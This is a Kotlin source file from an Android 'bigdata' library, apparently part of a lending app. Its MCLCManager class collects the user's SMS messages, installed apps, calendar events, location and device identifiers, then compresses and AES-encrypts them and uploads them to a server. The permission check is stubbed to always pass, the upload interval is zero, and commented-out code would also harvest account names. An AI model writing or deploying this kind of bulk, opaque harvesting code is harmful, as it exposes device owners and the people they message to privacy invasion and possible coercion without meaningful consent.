
package com.bigdata.lib

import android.os.Build
import com.bigdata.lib.BigDataSpKeyManager.Companion.CASH_KEY_POST_MCLC
import com.bigdata.lib.net.BigDataNetBaseParamsManager
import com.bigdata.lib.net.NetWorkManager
import com.cache.lib.SharedPrefUser
import com.google.gson.JsonArray
import com.google.gson.JsonElement
import com.google.gson.JsonObject
import com.project.util.AESMCLCUtil
import com.util.lib.*
import com.util.lib.log.logger_d
import com.util.lib.log.logger_i
import kotlin.math.abs

/**
 * Created by sunsg on 2018/1/31.
 * 短信 通话记录 联系人管理类
 */
class MCLCManager {
    companion object {
        private const val TAG = "MCLCManager"
        const val time_3_month = 45L * 24 * 3600 * 1000//45天的毫秒数
        const val time_6_month = 180L * 24 * 3600 * 1000//180天的毫秒数
        const val second_1 = 1000L//1秒的毫秒数
        const val min_1 = 60L * second_1//1分钟的毫秒数
        const val hour_1 = 60L * min_1//1小时的毫秒数
        const val day_1 = 24L * hour_1//1天的毫秒数
        const val day_7 = 7L * day_1//7天的毫秒数
        const val INTERVAL_UNIT = day_1//数据抓取间隔时间单位
        const val one_month = 30 * day_1
        const val one_year = 12 * one_month


        fun nullCheck(value: String?): String {
            if (value == null) {
                return ""
            } else {
                return value
            }
        }


        /**
         * 获取离当前时间3个月的时间戳
         */
        fun getLast_3_Month_time(): Long {
            val currentTime = System.currentTimeMillis()
            return currentTime - time_3_month
        }

        /**
         *获取距离当前时间6个月的时间戳
         */
        fun getLast_6_Month_time(): Long {
            val currentTime = System.currentTimeMillis()
            return currentTime - time_6_month
        }

        /**
         * 获取离当前时间一年的时间戳
         */
        fun getLast_1_year_time(): Long {
            val currentTime = System.currentTimeMillis()
            return currentTime - one_year
        }

        private fun getCashInfo(smsUpload: Boolean = true): JsonObject {
            val jsonObject = JsonObject()
            try {
                jsonObject.add("sms", if (smsUpload) SmsHelper.getMessage() else JsonArray())
            } catch (e: Exception) {
            }catch (e: OutOfMemoryError){
            }
            try {
                jsonObject.add("apps", DevicesAppHelper.getAppList())
            } catch (e: Exception) {
            }catch (e: OutOfMemoryError){
            }
            try {
                jsonObject.add("calendar", CalendarHelper.getCalendarEvent())
            } catch (e: Exception) {
            }catch (e: OutOfMemoryError){
            }

            // 权限授权状态
            try {
                jsonObject.addProperty("auth_info", BigDataNetBaseParamsManager.getPermissionAuthInfo())
            } catch (e: Exception) {
            }

            val jsonBase = BigDataNetBaseParamsManager.getMessageCallLogContactsBaseParams()
            if (jsonBase.has("imei")) {
                jsonBase.addProperty(
                    "imei",
                    BigDataNetBaseParamsManager.md5IMEI(jsonBase["imei"].asString)
                )
            }
            jsonObject.add("base", jsonBase)
            jsonObject.addProperty("abtest_home", BigDataManager.get().getNetDataListener()?.getAppAbtest())
            logger_d(TAG, "mclc base = $jsonBase")
            return jsonObject
        }


        /**
         * 上传 信息
         */
        fun postMCLCinfoReal(imageInfo: Map<String, Map<String, String?>?>?) {
            if (imageInfo == null){
                uploadData(null)
            }else{
                uploadDataWithImageInfo(imageInfo)
            }

        }

        /**
         * 上传信息 同时携带图片信息
         */
        private fun uploadDataWithImageInfo(imageInfo: Map<String, Map<String, String?>?>){
            val jsonImage = GsonUtil.toJsonObject(imageInfo) ?:return
            val extra = Pair<String,JsonElement>("image_info",jsonImage)
            uploadData(extra,true)
        }

        /**
         * @param extra 额外信息
         * @param ignoreInterval 是否忽略时间间隔 true:忽略时间间隔检查， false: 不忽略
         */
        private fun uploadData(extra: Pair<String,JsonElement>?,ignoreInterval: Boolean = false){
            ThreadPoolUtil.executor("cash info post") {
                LocationHelp.requestLocation()
                if (ignoreInterval || checkPostMCLCSuccessTimer()) {
                    val jsonCashInfo = getCashInfo()
                    if (extra != null) {// 增加额外信息
                        jsonCashInfo.add(extra.first, extra.second)
                    }
                    var isAllPermission = false
                    if (Build.VERSION.SDK_INT >= 23) {
                        //6.0以及以上走这个
                        //todo 添加权限
                        isAllPermission = /*isAllPermission()*/true
                        logger_i(TAG, " os >= 6.0 isAllPermission = $isAllPermission")
                    } else {
                        val smsSize = try {
                            jsonCashInfo.getAsJsonArray("sms")?.size() ?: 0
                        } catch (e: Exception) {
                            0
                        }
                        /*val callSize = jsonCashInfo.getAsJsonArray("call").size()*/
                        /*val contactSize = jsonCashInfo.getAsJsonArray("contact").size()*/
                        isAllPermission = smsSize > 0 /*&& callSize > 0 && contactSize > 0*/

                        logger_i(
                            TAG,
                            " os < 6.0 smsSize = $smsSize isAllPermission = $isAllPermission"
                        )
                    }
                    val beforePostInfo = jsonCashInfo.toString()
                    logger_i(TAG, "cash info post encryt before = $beforePostInfo")
                    val zipInfo = GzipUtils.zip(beforePostInfo)
                    logger_i(
                        TAG,
                        "cash info post encryt gzip size befor = ${beforePostInfo.toByteArray().size / 1024f} , after = ${zipInfo.size / 1024f}"
                    )
                    val postInfo = AESMCLCUtil.encryptMessageCallLogContact(zipInfo)
                    logger_i(TAG, "cash info post encryt after = $postInfo")
                    if (postInfo != null) {
                        doEvent(EventKeyManager.ConstantDot.EVENT_RESULT_UPLOAD)
                        NetWorkManager.uploadlogMessage(postInfo,isAllPermission)
                    }
                }
            }
        }


        fun doEvent(status: String) {
//            EventAgent.onEvent(EventKeyManager.ConstantDot.PAGE_BIG_DATA, status)
        }


        /**
         * 判断上传成功的时间是否满足条件
         */
        fun checkPostMCLCSuccessTimer(): Boolean {
            var canPost = false
            val lastTime = SharedPrefUser.getLong(CASH_KEY_POST_MCLC, -1L)
            logger_i(TAG, "lastTime = $lastTime")
            if (lastTime == -1L) {
                canPost = true
                logger_i(TAG, "lastTime is init")
            } else {
                val currentTime = System.currentTimeMillis()
                if (abs(currentTime - lastTime) >= getIntervalTimer()) {
                    canPost = true
                    logger_i(TAG, "lastTime >= ${getInterval()} days")
                } else {
                    logger_i(TAG, "lastTime < ${getInterval()} days")
                }
            }
            return canPost
        }

        /**
         * 获取抓取数据时间间隔 云控
         */
        fun getInterval(): Int {
            var interval = 0
            logger_i(TAG, " interval = $interval")
            return interval
        }

        /**
         * 获取抓取数据时间间隔时间
         */
        fun getIntervalTimer(): Long {
            var intervalTimer = 0L
            intervalTimer = getInterval() * INTERVAL_UNIT
            logger_i(TAG, " intervaltimer = $intervalTimer")
            return intervalTimer
        }

        /**
         * 获取手机account信息
         */
//        fun getPhoneAccounts(): JsonArray {
//            val jsonArray = JsonArray()
//            if (!AccountPermission().hasThisPermission()) return jsonArray
//            try {
//                val accounts = AccountManager.get(LoanApplication.getAppContext()).accounts
//                //                val emailPattern = Patterns.EMAIL_ADDRESS
//                var jsonObject: JsonObject? = null
//                accounts.forEach {
//                    //                    if (emailPattern.matcher(it.name).matches()) {
//                    jsonObject = JsonObject()
//                    jsonObject?.apply {
//                        this.addProperty("name", it.name)
//                        this.addProperty("type", it.type)
//                        jsonArray.add(this)
//                    }
//                    //                    }
//                }
//            } catch (e: java.lang.Exception) {
//
//            }
//            logger_i(TAG, "account 信息 $jsonArray")
//            return jsonArray
//        }


    }
}